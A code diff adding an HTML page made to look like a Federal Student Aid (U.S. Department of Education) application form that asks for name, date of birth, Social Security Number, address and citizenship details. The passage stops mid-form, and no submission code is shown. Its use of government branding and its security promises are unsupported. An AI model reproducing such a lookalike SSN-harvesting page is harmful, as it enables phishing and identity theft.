@@ -1,0 +1,1394 @@
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    const token = sessionStorage.getItem("token");
+    if (!token) {
+      // No token → redirect to login
+      window.location.href = "Auth.html";
+    }
+  });
+</script>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Application Form — Federal Student Aid</title>
+  <link rel="stylesheet" href="styles.css"/>
+  <style>
+    body { background: #f4f6fa; }
+
+    /* ══════════════════════════════════════
+       LAYOUT
+    ══════════════════════════════════════ */
+    .app-wrap {
+      max-width: 1140px;
+      margin: 0 auto;
+      padding: 36px 24px 72px;
+      display: grid;
+      grid-template-columns: 1fr 300px;
+      gap: 28px;
+      align-items: start;
+    }
+
+    /* ══════════════════════════════════════
+       FORM CARD
+    ══════════════════════════════════════ */
+    .form-card {
+      background: #fff;
+      border: 1px solid #dde2ec;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    /* Card header */
+    .form-card-head {
+      background: #0d1b3e;
+      padding: 0;
+      display: flex;
+      align-items: stretch;
+    }
+    .fch-accent {
+      width: 6px;
+      background: #c8a800;
+      flex-shrink: 0;
+    }
+    .fch-text {
+      padding: 22px 28px;
+    }
+    .fch-text h2 {
+      color: #fff;
+      font-size: 1.15rem;
+      margin-bottom: 4px;
+      font-family: 'Source Sans 3', sans-serif;
+      font-weight: 700;
+      letter-spacing: .01em;
+    }
+    .fch-text p {
+      color: rgba(255,255,255,.55);
+      font-size: .78rem;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .fch-text p::before { content: '🔒'; }
+
+    /* Step panes */
+    .step-pane { display: none; }
+    .step-pane.active {
+      display: block;
+      animation: paneFade .25s ease;
+    }
+    @keyframes paneFade {
+      from { opacity: 0; transform: translateY(6px); }
+      to   { opacity: 1; transform: translateY(0);   }
+    }
+
+    /* ══════════════════════════════════════
+       SECTION HEADER inside form
+    ══════════════════════════════════════ */
+    .section-divider {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 28px 32px 0;
+      margin-bottom: 0;
+    }
+    .section-divider-num {
+      width: 32px; height: 32px;
+      border-radius: 50%;
+      background: #0d1b3e;
+      color: #fff;
+      font-size: .85rem;
+      font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .section-divider-text {}
+    .section-divider-text h3 {
+      font-size: 1rem;
+      font-weight: 700;
+      color: #0d1b3e;
+      margin-bottom: 1px;
+      font-family: 'Source Sans 3', sans-serif;
+    }
+    .section-divider-text p {
+      font-size: .75rem;
+      color: #8a94a6;
+      letter-spacing: .02em;
+    }
+
+    /* ══════════════════════════════════════
+       FIELD GROUPS — clean document look
+    ══════════════════════════════════════ */
+    .fields-block {
+      padding: 20px 32px 28px;
+      border-bottom: 1px solid #eef0f5;
+    }
+    .fields-block:last-child { border-bottom: none; }
+
+    /* Notice bar inside form */
+    .form-notice {
+      margin: 0 32px 0;
+      padding: 11px 16px;
+      background: #f0f4fb;
+      border-left: 3px solid #0d1b3e;
+      border-radius: 0 5px 5px 0;
+      font-size: .8rem;
+      color: #3a4a6b;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+    }
+    .form-notice b { color: #0d1b3e; }
+
+    /* Row grid */
+    .field-row   { display: grid; gap: 16px; margin-bottom: 0; }
+    .field-row-2 { grid-template-columns: 1fr 1fr; }
+    .field-row-3 { grid-template-columns: 1fr 1fr 1fr; }
+    .field-row-13{ grid-template-columns: 1fr 2fr; }
+
+    /* Individual field */
+    .field {
+      display: flex;
+      flex-direction: column;
+    }
+    .field + .field { /* spacing handled by gap */ }
+
+    .field label {
+      font-size: .72rem;
+      font-weight: 700;
+      letter-spacing: .09em;
+      text-transform: uppercase;
+      color: #5a6478;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .req { color: #b00020; font-size: .8rem; }
+
+    .field input,
+    .field select,
+    .field textarea {
+      width: 100%;
+      padding: 10px 14px;
+      border: 1px solid #d0d6e4;
+      border-radius: 6px;
+      font-family: 'Source Sans 3', sans-serif;
+      font-size: .9rem;
+      color: #1a2133;
+      background: #fff;
+      transition: border-color .18s, box-shadow .18s;
+      appearance: none;
+      height: 42px;
+    }
+    .field input:focus,
+    .field select:focus {
+      outline: none;
+      border-color: #0d1b3e;
+      box-shadow: 0 0 0 3px rgba(13,27,62,.09);
+    }
+    .field input.has-value,
+    .field select.has-value {
+      border-color: #b0bcd4;
+      background: #fafbfd;
+    }
+    .field input.error,
+    .field select.error {
+      border-color: #b00020;
+      box-shadow: 0 0 0 3px rgba(176,0,32,.08);
+    }
+    .field input::placeholder { color: #b8c2d4; }
+
+    select.field-select {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%235a6478' stroke-width='2.5'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 12px center;
+      padding-right: 36px;
+      cursor: pointer;
+    }
+
+    .field-hint {
+      font-size: .72rem;
+      color: #9aa0b0;
+      margin-top: 5px;
+      line-height: 1.5;
+    }
+    .field-err {
+      font-size: .72rem;
+      color: #b00020;
+      font-weight: 700;
+      margin-top: 4px;
+      display: none;
+      align-items: center;
+      gap: 4px;
+    }
+    .field-err::before { content: '⚠'; font-size: .7rem; }
+    .field-err.show { display: flex; }
+
+    /* ══════════════════════════════════════
+       SSN FIELD — special treatment
+    ══════════════════════════════════════ */
+    .ssn-field-wrap { position: relative; }
+    .ssn-field-wrap input { padding-right: 60px; letter-spacing: .15em; font-weight: 600; }
+    .ssn-masked { -webkit-text-security: disc; text-security: disc; }
+    .ssn-eye {
+      position: absolute;
+      right: 0; top: 0; bottom: 0;
+      width: 44px;
+      display: flex; align-items: center; justify-content: center;
+      background: none; border: none;
+      border-left: 1px solid #d0d6e4;
+      cursor: pointer;
+      color: #5a6478;
+      font-size: .78rem;
+      font-weight: 700;
+      font-family: 'Source Sans 3', sans-serif;
+      letter-spacing: .03em;
+      border-radius: 0 6px 6px 0;
+      transition: background .15s, color .15s;
+    }
+    .ssn-eye:hover { background: #f0f4fb; color: #0d1b3e; }
+    .ssn-secure {
+      display: flex; align-items: center; gap: 5px;
+      font-size: .7rem; color: #7a8598; margin-top: 5px;
+    }
+    .ssn-secure svg { flex-shrink: 0; }
+
+    /* ══════════════════════════════════════
+       DOB — styled date input
+    ══════════════════════════════════════ */
+    input[type="date"] { color: #1a2133; }
+    input[type="date"]::-webkit-calendar-picker-indicator {
+      opacity: .4; cursor: pointer;
+    }
+
+    /* ══════════════════════════════════════
+       FIELD GROUP LABEL (sub-section)
+    ══════════════════════════════════════ */
+    .field-group-label {
+      font-size: .68rem;
+      font-weight: 700;
+      letter-spacing: .13em;
+      text-transform: uppercase;
+      color: #0d1b3e;
+      border-bottom: 1px solid #eef0f5;
+      padding-bottom: 7px;
+      margin-bottom: 14px;
+      margin-top: 18px;
+    }
+    .field-group-label:first-child { margin-top: 0; }
+
+    /* ══════════════════════════════════════
+       RADIO PILL OPTIONS
+    ══════════════════════════════════════ */
+    .pill-group { display: flex; gap: 8px; flex-wrap: wrap; }
+    .pill-option {
+      flex: 1; min-width: 90px;
+      border: 1px solid #d0d6e4;
+      border-radius: 6px;
+      padding: 9px 12px;
+      display: flex; align-items: center; gap: 7px;
+      cursor: pointer;
+      font-size: .85rem;
+      font-weight: 600;
+      color: #5a6478;
+      transition: all .16s;
+      user-select: none;
+    }
+    .pill-option:has(input:checked) {
+      border-color: #0d1b3e;
+      background: #f0f4fb;
+      color: #0d1b3e;
+    }
+    .pill-option input { accent-color: #0d1b3e; width: 14px; height: 14px; flex-shrink: 0; }
+
+    /* ══════════════════════════════════════
+       CERTIFICATION BLOCK (step 5)
+    ══════════════════════════════════════ */
+    .cert-block {
+      margin: 24px 32px 0;
+      padding: 18px 20px;
+      background: #f9fafc;
+      border: 1px solid #dde2ec;
+      border-radius: 8px;
+    }
+    .cert-block label {
+      display: flex; align-items: flex-start; gap: 12px;
+      font-size: .88rem; color: #3a4255; line-height: 1.65;
+      cursor: pointer;
+    }
+    .cert-block input[type="checkbox"] {
+      width: 18px; height: 18px; flex-shrink: 0;
+      accent-color: #0d1b3e; margin-top: 2px; cursor: pointer;
+    }
+
+    /* ══════════════════════════════════════
+       FORM NAVIGATION BAR
+    ══════════════════════════════════════ */
+    .form-nav-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 18px 32px;
+      background: #f9fafc;
+      border-top: 1px solid #eef0f5;
+    }
+    .form-nav-bar .step-indicator {
+      font-size: .75rem;
+      font-weight: 700;
+      color: #8a94a6;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+    }
+    .btn-nav-back {
+      display: inline-flex; align-items: center; gap: 6px;
+      padding: 9px 20px; border-radius: 6px;
+      border: 1px solid #d0d6e4; background: #fff;
+      font-family: 'Source Sans 3', sans-serif;
+      font-size: .82rem; font-weight: 700;
+      color: #5a6478; cursor: pointer;
+      letter-spacing: .04em; text-transform: uppercase;
+      transition: all .16s;
+    }
+    .btn-nav-back:hover { background: #f0f4fb; border-color: #0d1b3e; color: #0d1b3e; }
+    .btn-nav-next {
+      display: inline-flex; align-items: center; gap: 6px;
+      padding: 10px 24px; border-radius: 6px;
+      border: none; background: #0d1b3e;
+      font-family: 'Source Sans 3', sans-serif;
+      font-size: .82rem; font-weight: 700;
+      color: #fff; cursor: pointer;
+      letter-spacing: .04em; text-transform: uppercase;
+      transition: background .16s;
+    }
+    .btn-nav-next:hover { background: #001540; }
+    .btn-nav-next.submit-btn { background: #1a7a4a; }
+    .btn-nav-next.submit-btn:hover { background: #145e38; }
+
+    /* ══════════════════════════════════════
+       SIDEBAR
+    ══════════════════════════════════════ */
+    .sidebar { display: flex; flex-direction: column; gap: 16px; }
+
+    .sb-card {
+      background: #fff;
+      border: 1px solid #dde2ec;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .sb-card-head {
+      background: #f4f6fa;
+      border-bottom: 1px solid #dde2ec;
+      padding: 11px 18px;
+      font-size: .7rem;
+      font-weight: 700;
+      letter-spacing: .12em;
+      text-transform: uppercase;
+      color: #5a6478;
+    }
+    .sb-card-body { padding: 14px 18px; }
+
+    .sb-sec-list { list-style: none; }
+    .sb-sec-list li {
+      display: flex; align-items: center; gap: 10px;
+      font-size: .82rem; color: #5a6478;
+      padding: 7px 0; border-bottom: 1px solid #f0f2f7;
+    }
+    .sb-sec-list li:last-child { border-bottom: none; }
+    .sb-icon {
+      width: 24px; height: 24px;
+      background: #eef0f5; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: .7rem; flex-shrink: 0;
+    }
+
+    .sb-doc-list { list-style: none; }
+    .sb-doc-list li {
+      font-size: .82rem; color: #5a6478;
+      padding: 6px 0; border-bottom: 1px solid #f0f2f7;
+      display: flex; align-items: center; gap: 7px;
+    }
+    .sb-doc-list li:last-child { border-bottom: none; }
+    .sb-doc-list li::before {
+      content: '';
+      width: 6px; height: 6px; border-radius: 50%;
+      background: #0d1b3e; flex-shrink: 0;
+    }
+
+    .sb-help-card { background: #0d1b3e; border-color: #0d1b3e; }
+    .sb-help-card .sb-card-head { background: #1a2b54; border-color: rgba(255,255,255,.1); color: #c8a800; }
+    .sb-help-body { padding: 16px 18px; }
+    .sb-help-body p { font-size: .82rem; color: rgba(255,255,255,.65); margin-bottom: 12px; line-height: 1.55; }
+    .sb-call-btn {
+      display: block; text-align: center;
+      background: #fff; color: #0d1b3e;
+      padding: 9px 14px; border-radius: 6px;
+      font-weight: 700; font-size: .8rem;
+      letter-spacing: .04em; text-transform: uppercase;
+      text-decoration: none; margin-bottom: 8px;
+      transition: background .15s;
+    }
+    .sb-call-btn:hover { background: #e8ecf4; color: #0d1b3e; }
+    .sb-faq-link {
+      display: block; text-align: center;
+      font-size: .78rem; color: rgba(255,255,255,.5);
+      text-decoration: underline;
+    }
+    .sb-faq-link:hover { color: rgba(255,255,255,.8); }
+
+    /* Dep result */
+    .dep-result-box {
+      display: none;
+      margin: 0 32px 4px;
+      padding: 12px 16px;
+      border-radius: 6px;
+      font-size: .85rem;
+      font-weight: 600;
+    }
+    .dep-result-box.independent { background: #e6f4ea; color: #145e38; border: 1px solid #a8d5b5; }
+    .dep-result-box.dependent   { background: #f0f4fb; color: #0d1b3e; border: 1px solid #c0cce4; }
+
+    /* ══════════════════════════════════════
+       PROGRESS STEPS — refined
+    ══════════════════════════════════════ */
+    .progress-wrap {
+      background: #fff;
+      border-bottom: 1px solid #dde2ec;
+      position: sticky; top: 68px; z-index: 100;
+    }
+    .progress-inner {
+      max-width: 1140px; margin: 0 auto;
+      padding: 0 24px;
+      display: flex; align-items: stretch;
+    }
+    .prog-step {
+      flex: 1; display: flex; align-items: center;
+      padding: 14px 16px 12px;
+      border-bottom: 3px solid transparent;
+      gap: 10px;
+      transition: border-color .2s;
+    }
+    .prog-step.active   { border-bottom-color: #0d1b3e; }
+    .prog-step.completed{ border-bottom-color: #1a7a4a; }
+
+    .prog-circle {
+      width: 28px; height: 28px; border-radius: 50%;
+      border: 1.5px solid #d0d6e4;
+      background: #fff;
+      display: flex; align-items: center; justify-content: center;
+      font-size: .75rem; font-weight: 700; color: #9aa0b0;
+      flex-shrink: 0; transition: all .2s;
+    }
+    .prog-step.active    .prog-circle { background: #0d1b3e; border-color: #0d1b3e; color: #fff; }
+    .prog-step.completed .prog-circle { background: #1a7a4a; border-color: #1a7a4a; color: #fff; }
+
+    .prog-label-wrap {}
+    .prog-step-num  { font-size: .65rem; color: #9aa0b0; font-weight: 700; letter-spacing: .08em; text-transform: uppercase; }
+    .prog-step-name { font-size: .82rem; font-weight: 700; color: #9aa0b0; }
+    .prog-step.active    .prog-step-name { color: #0d1b3e; }
+    .prog-step.completed .prog-step-name { color: #1a7a4a; }
+
+    .prog-divider { width: 1px; background: #eef0f5; align-self: stretch; flex-shrink: 0; }
+
+    /* ══════════════════════════════════════
+       RESPONSIVE
+    ══════════════════════════════════════ */
+    @media(max-width:900px){
+      .app-wrap { grid-template-columns: 1fr; }
+      .sidebar  { display: none; }
+      .fields-block { padding: 16px 20px 22px; }
+      .section-divider { padding: 22px 20px 0; }
+      .form-nav-bar { padding: 14px 20px; }
+      .form-notice  { margin: 0 20px; }
+      .cert-block   { margin: 18px 20px 0; }
+      .dep-result-box { margin: 0 20px 4px; }
+      .prog-step-num, .prog-step-name { display: none; }
+      .prog-step  { padding: 12px 12px 10px; justify-content: center; }
+    }
+    @media(max-width:600px){
+      .field-row-2, .field-row-3, .field-row-13 { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ── HEADER ── -->
+<header class="site-header">
+  <div class="header-inner">
+    <a href="index.html" class="logo">
+      <div class="logo-seal">🎓</div>
+      <div class="logo-text">Federal Student Aid<span>U.S. Department of Education</span></div>
+    </a>
+    <nav class="nav">
+      <a href="index.html">Home</a>
+      <a href="eligibility.html">Eligibility</a>
+      <a href="faq.html">Help &amp; FAQ</a>
+      <a href="privacy.html">Privacy</a>
+      <a href="application.html" class="nav-cta active">Apply Now</a>
+    </nav>
+    <button class="hamburger" id="hamburger" aria-label="Open menu"><span></span><span></span><span></span></button>
+  </div>
+  <nav class="mobile-menu" id="mobileMenu">
+    <a href="index.html">Home</a><a href="eligibility.html">Eligibility</a>
+    <a href="faq.html">FAQ</a><a href="privacy.html">Privacy</a>
+    <a href="application.html">Apply Now →</a>
+  </nav>
+</header>
+
+<!-- ── PROGRESS STEPS ── -->
+<div class="progress-wrap">
+  <div class="progress-inner" id="progressInner">
+    <div class="prog-step active" data-step="1">
+      <div class="prog-circle">1</div>
+      <div class="prog-label-wrap">
+        <div class="prog-step-num">Step 1</div>
+        <div class="prog-step-name">Identity</div>
+      </div>
+    </div>
+    <div class="prog-divider"></div>
+    <div class="prog-step" data-step="2">
+      <div class="prog-circle">2</div>
+      <div class="prog-label-wrap">
+        <div class="prog-step-num">Step 2</div>
+        <div class="prog-step-name">Contact</div>
+      </div>
+    </div>
+    <div class="prog-divider"></div>
+    <div class="prog-step" data-step="3">
+      <div class="prog-circle">3</div>
+      <div class="prog-label-wrap">
+        <div class="prog-step-num">Step 3</div>
+        <div class="prog-step-name">Demographics</div>
+      </div>
+    </div>
+    <div class="prog-divider"></div>
+    <div class="prog-step" data-step="4">
+      <div class="prog-circle">4</div>
+      <div class="prog-label-wrap">
+        <div class="prog-step-num">Step 4</div>
+        <div class="prog-step-name">Education</div>
+      </div>
+    </div>
+    <div class="prog-divider"></div>
+    <div class="prog-step" data-step="5">
+      <div class="prog-circle">5</div>
+      <div class="prog-label-wrap">
+        <div class="prog-step-num">Step 5</div>
+        <div class="prog-step-name">Dependency</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<main>
+  <div class="app-wrap">
+
+    <!-- ═══════════════════════════════
+         MAIN FORM CARD
+    ═══════════════════════════════ -->
+    <div>
+      <div class="form-card">
+
+        <!-- Card header -->
+        <div class="form-card-head">
+          <div class="fch-accent"></div>
+          <div class="fch-text">
+            <h2 id="formHeadTitle">Section 1 — Student Identity</h2>
+            <p>This form is protected with 256-bit SSL encryption. Your information is secure.</p>
+          </div>
+        </div>
+
+        <!-- ═══ STEP 1: IDENTITY ═══ -->
+        <div class="step-pane active" id="step-1">
+
+          <div class="section-divider" style="padding-top:26px;">
+            <div class="section-divider-num">1</div>
+            <div class="section-divider-text">
+              <h3>Student Identity</h3>
+              <p>Enter your full legal name exactly as shown on your government-issued ID</p>
+            </div>
+          </div>
+
+          <!-- Notice -->
+          <div style="padding: 14px 32px 0;">
+            <div class="form-notice">
+              <span>ℹ</span>
+              <span>Fields marked <b style="color:#b00020;">*</b> are required. Use your full legal name — no nicknames or abbreviations.</span>
+            </div>
+          </div>
+
+          <div class="fields-block">
+
+            <!-- Full Name -->
+            <div class="field-group-label">Full Legal Name</div>
+            <div class="field-row field-row-3" style="margin-bottom:16px;">
+              <div class="field">
+                <label>First Name <span class="req">*</span></label>
+                <input type="text" id="firstName" class="form-control-new" placeholder="e.g. Jonathan" autocomplete="given-name"/>
+                <span class="field-err" id="firstNameErr">First name is required</span>
+              </div>
+              <div class="field">
+                <label>Middle Name</label>
+                <input type="text" id="middleName" class="form-control-new" placeholder="Optional" autocomplete="additional-name"/>
+              </div>
+              <div class="field">
+                <label>Last Name <span class="req">*</span></label>
+                <input type="text" id="lastName" class="form-control-new" placeholder="e.g. Williams" autocomplete="family-name"/>
+                <span class="field-err" id="lastNameErr">Last name is required</span>
+              </div>
+            </div>
+
+            <div class="field-row field-row-13" style="margin-bottom:0;">
+              <div class="field">
+                <label>Suffix</label>
+                <select id="suffix" class="form-control-new field-select">
+                  <option value="">None</option>
+                  <option>Jr.</option><option>Sr.</option>
+                  <option>II</option><option>III</option><option>IV</option>
+                </select>
+              </div>
+              <div class="field">
+                <!-- spacer -->
+              </div>
+            </div>
+
+          </div>
+
+          <div class="fields-block">
+
+            <!-- Date of Birth & SSN -->
+            <div class="field-group-label">Date of Birth &amp; Social Security Number</div>
+            <div class="field-row field-row-2">
+
+              <div class="field">
+                <label>Date of Birth <span class="req">*</span></label>
+                <input type="date" id="dob" class="form-control-new" autocomplete="bday"/>
+                <span class="field-hint">Must be at least 13 years of age</span>
+                <span class="field-err" id="dobErr">Date of birth is required</span>
+              </div>
+
+              <div class="field">
+                <label>Social Security Number (SSN) <span class="req">*</span></label>
+                <div class="ssn-field-wrap">
+                  <input type="text" id="ssn" class="form-control-new ssn-masked" placeholder="XXX-XX-XXXX"
+                    maxlength="11" inputmode="numeric" autocomplete="off" spellcheck="false"
+                    aria-describedby="ssnSecureNote"/>
+                  <button type="button" class="ssn-eye" id="ssnToggle" aria-label="Toggle SSN visibility">Show</button>
+                </div>
+                <div class="ssn-secure" id="ssnSecureNote">
+                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#7a8598" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                  Encrypted in transit — never stored in plain text
+                </div>
+                <span class="field-err" id="ssnErr">Enter a valid 9-digit SSN (format: XXX-XX-XXXX)</span>
+              </div>
+
+            </div>
+
+          </div>
+
+        </div><!-- /step-1 -->
+
+        <!-- ═══ STEP 2: CONTACT ═══ -->
+        <div class="step-pane" id="step-2">
+
+          <div class="section-divider" style="padding-top:26px;">
+            <div class="section-divider-num">2</div>
+            <div class="section-divider-text">
+              <h3>Contact Information</h3>
+              <p>Your current mailing address and contact details</p>
+            </div>
+          </div>
+
+          <div class="fields-block">
+            <div class="field-group-label">Mailing Address</div>
+
+            <div class="field" style="margin-bottom:14px;">
+              <label>Street Address <span class="req">*</span></label>
+              <input type="text" id="address1" class="form-control-new" placeholder="e.g. 1234 Elm Street" autocomplete="address-line1"/>
+              <span class="field-err" id="address1Err">Street address is required</span>
+            </div>
+            <div class="field" style="margin-bottom:14px;">
+              <label>Address Line 2</label>
+              <input type="text" id="address2" class="form-control-new" placeholder="Apt, Suite, Unit — optional" autocomplete="address-line2"/>
+            </div>
+
+            <div class="field-row field-row-3">
+              <div class="field">
+                <label>City <span class="req">*</span></label>
+                <input type="text" id="city" class="form-control-new" placeholder="e.g. Austin" autocomplete="address-level2"/>
+                <span class="field-err" id="cityErr">City is required</span>
+              </div>
+              <div class="field">
+                <label>State <span class="req">*</span></label>
+                <select id="state" class="form-control-new field-select" autocomplete="address-level1">
+                  <option value="">— Select —</option>
+                  <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option>
+                  <option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option>
+                  <option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option>
+                  <option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option>
+                  <option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option>
+                  <option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option>
+                  <option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option>
+                  <option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option>
+                  <option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option>
+                  <option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option>
+                  <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option>
+                  <option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option>
+                  <option>Wisconsin</option><option>Wyoming</option><option>District of Columbia</option>
+                </select>
+                <span class="field-err" id="stateErr">State is required</span>
+              </div>
+              <div class="field">
+                <label>ZIP Code <span class="req">*</span></label>
+                <input type="text" id="zip" class="form-control-new" placeholder="e.g. 78701" maxlength="5" inputmode="numeric" autocomplete="postal-code"/>
+                <span class="field-err" id="zipErr">Enter a valid 5-digit ZIP</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="fields-block">
+            <div class="field-group-label">Phone &amp; Email</div>
+            <div class="field-row field-row-2">
+              <div class="field">
+                <label>Phone Number <span class="req">*</span></label>
+                <input type="tel" id="phone" class="form-control-new" placeholder="(555) 000-0000" autocomplete="tel"/>
+                <span class="field-hint">U.S. mobile or landline number</span>
+                <span class="field-err" id="phoneErr">Enter a valid 10-digit phone number</span>
+              </div>
+              <div class="field">
+                <label>Email Address <span class="req">*</span></label>
+                <input type="email" id="email" class="form-control-new" placeholder="you@example.com" autocomplete="email"/>
+                <span class="field-hint">Your Student Aid Report will be sent here</span>
+                <span class="field-err" id="emailErr">Enter a valid email address</span>
+              </div>
+            </div>
+          </div>
+
+        </div><!-- /step-2 -->
+
+        <!-- ═══ STEP 3: DEMOGRAPHICS ═══ -->
+        <div class="step-pane" id="step-3">
+
+          <div class="section-divider" style="padding-top:26px;">
+            <div class="section-divider-num">3</div>
+            <div class="section-divider-text">
+              <h3>Demographics</h3>
+              <p>Used to determine aid eligibility — all optional fields are marked</p>
+            </div>
+          </div>
+
+          <div class="fields-block">
+            <div class="field-group-label">Identity &amp; Status</div>
+
+            <div class="field" style="margin-bottom:18px;">
+              <label>Gender <span style="font-weight:400;text-transform:none;letter-spacing:0;color:#9aa0b0;">(Optional)</span></label>
+              <div class="pill-group">
+                <label class="pill-option"><input type="radio" name="gender" value="male"> Male</label>
+                <label class="pill-option"><input type="radio" name="gender" value="female"> Female</label>
+                <label class="pill-option"><input type="radio" name="gender" value="nonbinary"> Non-binary</label>
+                <label class="pill-option"><input type="radio" name="gender" value="prefer-not"> Prefer not to say</label>
+              </div>
+            </div>
+
+            <div class="field-row field-row-2">
+              <div class="field">
+                <label>Citizenship Status <span class="req">*</span></label>
+                <select id="citizenship" class="form-control-new field-select">
+                  <option value="">— Select —</option>
+                  <option value="us-citizen">U.S. Citizen</option>
+                  <option value="permanent-resident">U.S. Permanent Resident</option>
+                  <option value="eligible-noncitizen">Eligible Non-Citizen</option>
+                  <option value="other">Other</option>
+                </select>
+                <span class="field-err" id="citizenshipErr">Citizenship status is required</span>
+              </div>
+              <div class="field">
+                <label>Marital Status <span class="req">*</span></label>
+                <select id="maritalSelect" class="form-control-new field-select">
+                  <option value="">— Select —</option>
+                  <option value="single">Single</option>
+                  <option value="married">Married / Remarried</option>
+                  <option value="separated">Separated</option>
+                  <option value="divorced">Divorced / Widowed</option>
+                </select>
+                <span class="field-err" id="maritalErr">Marital status is required</span>
+              </div>
+            </div>
+          </div>
+
+        </div><!-- /step-3 -->
+
+        <!-- ═══ STEP 4: EDUCATION ═══ -->
+        <div class="step-pane" id="step-4">
+
+          <div class="section-divider" style="padding-top:26px;">
+            <div class="section-divider-num">4</div>
+            <div class="section-divider-text">
+              <h3>Educational Background</h3>
+              <p>High school completion and intended college enrollment</p>
+            </div>
+          </div>
+
+          <div class="fields-block">
+            <div class="field-group-label">High School</div>
+            <div class="field-row field-row-2" style="margin-bottom:0;">
+              <div class="field">
+                <label>High School Name <span class="req">*</span></label>
+                <input type="text" id="hsName" class="form-control-new" placeholder="e.g. Lincoln High School"/>
+                <span class="field-err" id="hsNameErr">High school name is required</span>
+              </div>
+              <div class="field">
+                <label>Graduation Year <span class="req">*</span></label>
+                <select id="hsGrad" class="form-control-new field-select">
+                  <option value="">— Select Year —</option>
+                  <script>for(let y=2026;y>=1970;y--) document.write(`<option value="${y}">${y}</option>`);</script>
+                  <option value="ged">GED / Equivalency</option>
+                  <option value="homeschool">Home Schooled</option>
+                </select>
+                <span class="field-err" id="hsGradErr">Graduation year is required</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="fields-block">
+            <div class="field-group-label">College / University</div>
+            <div class="field" style="margin-bottom:14px;">
+              <label>Institution Name <span class="req">*</span></label>
+              <input type="text" id="collegeName" class="form-control-new" placeholder="e.g. University of Texas at Austin"/>
+              <span class="field-hint">If undecided, enter your top choice or type "Undecided"</span>
+              <span class="field-err" id="collegeNameErr">College/university name is required</span>
+            </div>
+            <div class="field-row field-row-2">
+              <div class="field">
+                <label>Degree Level <span class="req">*</span></label>
+                <select id="degreeLevel" class="form-control-new field-select">
+                  <option value="">— Select —</option>
+                  <option>Certificate / Diploma</option>
+                  <option>Associate Degree (2-year)</option>
+                  <option>Bachelor's Degree (4-year)</option>
+                  <option>Master's Degree</option>
+                  <option>Doctoral Degree</option>
+                  <option>Professional Degree (Law/Medicine)</option>
+                </select>
+                <span class="field-err" id="degreeLevelErr">Degree level is required</span>
+              </div>
+              <div class="field">
+                <label>Enrollment Status <span class="req">*</span></label>
+                <select id="enrollStatus" class="form-control-new field-select">
+                  <option value="">— Select —</option>
+                  <option value="full-time">Full-Time</option>
+                  <option value="half-time">Half-Time</option>
+                  <option value="less-than-half">Less than Half-Time</option>
+                  <option value="not-enrolled">Not Yet Enrolled</option>
+                </select>
+                <span class="field-err" id="enrollStatusErr">Enrollment status is required</span>
+              </div>
+            </div>
+          </div>
+
+        </div><!-- /step-4 -->
+
+        <!-- ═══ STEP 5: DEPENDENCY ═══ -->
+        <div class="step-pane" id="step-5">
+
+          <div class="section-divider" style="padding-top:26px;">
+            <div class="section-divider-num">5</div>
+            <div class="section-divider-text">
+              <h3>Dependency Status &amp; Income</h3>
+              <p>Determines whether parental financial data is required</p>
+            </div>
+          </div>
+
+          <div style="padding: 14px 32px 0;">
+            <div class="form-notice">
+              <span>ℹ</span>
+              <span>Answer <b>Yes</b> to any question to qualify as an <b>Independent Student</b>. Independent students do not need to provide parental income information.</span>
+            </div>
+          </div>
+
+          <div class="fields-block">
+            <div class="field-group-label">Dependency Questions</div>
+
+            <div class="field" style="margin-bottom:14px;">
+              <label>1 — Will you be 24 or older on January 1 of the award year? <span class="req">*</span></label>
+              <div class="pill-group">
+                <label class="pill-option"><input type="radio" name="dep1" value="yes"> Yes</label>
+                <label class="pill-option"><input type="radio" name="dep1" value="no"> No</label>
+              </div>
+            </div>
+            <div class="field" style="margin-bottom:14px;">
+              <label>2 — Are you married or separated (not divorced)? <span class="req">*</span></label>
+              <div class="pill-group">
+                <label class="pill-option"><input type="radio" name="dep2" value="yes"> Yes</label>
+                <label class="pill-option"><input type="radio" name="dep2" value="no"> No</label>
+              </div>
+            </div>
+            <div class="field" style="margin-bottom:14px;">
+              <label>3 — Were you, or are you, an emancipated minor? <span class="req">*</span></label>
+              <div class="pill-group">
+                <label class="pill-option"><input type="radio" name="dep3" value="yes"> Yes</label>
+                <label class="pill-option"><input type="radio" name="dep3" value="no"> No</label>
+              </div>
+            </div>
+            <div class="field" style="margin-bottom:14px;">
